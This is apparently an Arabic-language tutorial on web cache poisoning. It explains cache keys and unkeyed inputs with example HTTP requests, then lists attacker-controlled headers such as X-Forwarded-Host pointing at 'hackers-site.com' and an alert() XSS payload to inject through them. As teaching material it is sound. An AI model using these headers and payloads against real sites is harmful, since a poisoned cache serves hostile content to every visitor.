@@ -1,0 +1,70 @@
+السلام عليكم , حبيت اشارك مع حضراتكم ال Methodology الخاصة ب Cache Poisoning لعل وعسى حد يستفيد في البدايه المواقع اللي بتقدم اي Service احيانا بتلجأ لCache ودي عباره عن Memory او مكان بخزن فيه الداتا اللي دايما ال users يحتاجوا access عليها او بتتكرر بشكل كبير ودا بيقلل من overload عند ال server ..... في البدايه فيه كام تعريف :
+Cache poisoning : means that the attacker puts malicious content in the cache to affect all users
+ودا تعريف ال Cache poisoning ببساطه
+Cache Key : means caching data and associating it with a specific identifier or key
+ال Cache Key عبارة عن identifier اللي من خلاله اقدر اوصل للداتا الموجوده مثال ولنفترض ال Cache يحتوي علي انواع مختلفة من ال Files مثل صور وملفات واصوات .... كل واحد له Cache_Key من خلاله احصل علي Resources
+ال Cache ممكن يكون Proxy او Content Delivery Network ....
+Unkeyed Input : means the part of requests that a cache ignores
+مثال يوضح الفرق بينهم في البدايه لنتفرض ان الموقع عند set of rules بناء عليهم استطيع بناء Cache_Key :
+
+    Include the method (GET, POST) of the request
+    Include the full URL path
+    Include the value of the "User-Agent" header
+
+الريكوست :
+GET /example-page?id=123 HTTP/1.1
+Host: example.com
+User-Agent: Mozilla/5.0
+الريسبونس :
+HTTP/1.1 200 OK
+Content-Type: text/html
+ماهو الشكل الخاص ب Cache_Key ؟
+طبقا لمجموعة ال Rules اعلاه :
+Cache_Key : GET | https://example.com/example-page?id=123 | Mozilla/5.0 Chrome/90.0
+الان عندما يقوم مستخدم أخر يستخدم google Chrome بعمل نفس الريكوست يرى نفس الرد :
+HTTP/1.1 200 OK
+Content-Type: text/html
+والسبب ان الريكوست اصبح له Cache_Key يعرض نفس الريسبونس حتى لو كان Browser مختلف
+الان نقوم بعمل ريكويست اخر مع اضافة بعض Headers
+الريكويست مع اضافة Accept-Language Header و ال Value انجلش :
+GET /images/info/img?id=123 HTTP/1.1
+Host: Example
+User-Agent: Mozilla/.....
+Accept-Language: en-US
+ريكويست ثاني من شخص اخر مع اختلاف اللغة وهي الفرنسية :
+GET /images/info/img?id=123 HTTP/1.1
+Host: Example.com
+User-Agent: Mozilla/.....
+Accept-Language: FR
+اذا نرى ان اول وثاني Request لهم نفس Cache_Key :
+Cache_Key : GET | https://Example.com/images/info/img?id=123 | Mozilla/5.0
+وهنا نرى ان Accept-Language Header لم يدخل في تكوين Cache_Key هذا هو ال Unkeyed Inputs لانه حدث له ignore من Cache
+How Test For Cache Poisoning :
+في البداية نقوم بعمل Request عادي ثم ننتظر ال Response وهناك بعض ال Server Cache Headers الذي توضح لنا هل الريكوست حدث له Served من Cache ام من ال Server :
+X-Cache -> take the values : hit or miss
+Cache-Control -> take values : no-cache or public
+Server-Timing
+دول بعض ال Cache Headers في Response :
+HTTP/1.1 200 OK
+Content-Type: text/html
+Server-Timing: cdn-cache; desc=HIT
+وهنا ال Response بيعرفنا ان حصل Served للريكويست من Cache وليس ال Server ومن عند هذه النقظة نقوم بعمل "poisoning"
+الريكويست مع اضافة Header لايستطيع ال server او Cache معالجته :
+GET /images/info/img?id=123 HTTP/1.1
+\:
+Host: Example.com
+User-Agent: Mozilla/....
+قمنا باضافة 😕 كا header و حدث Cache للريسبونس واذ قمنا بعمل ريكويست مرة اخرى في اي متصفح ثم تظهر لنا : Bad Message 400 وحدث Reflected للHeader وهذا يدل علي ان Cache لم يستطيع بمعالجة الطلب
+Headers That Can Be Used To Cache :
+X-Forwarded-Host: hackers-site.com
+X-Host: hackers-site.com
+Forwarded-Server: hackers-site.com
+For Xss we can replace \: with X-Forwarded-Host
+GET /images/info/img?id=123 HTTP/1.1
+Host: Example.com
+User-Agent: Mozilla/....
+X-Forwarded-Host: <script>alert(1)</script>
+Finally, I recommend you to use param-miner extension That help you identify hidden, unlinked parameters : https://github.com/PortSwigger/param-miner
+and If you want to learn more , I recommend that you take a look :
+https://book.hacktricks.xyz/pentesting-web/cache-deception
+I've learned a lot from there ,Thanks all 
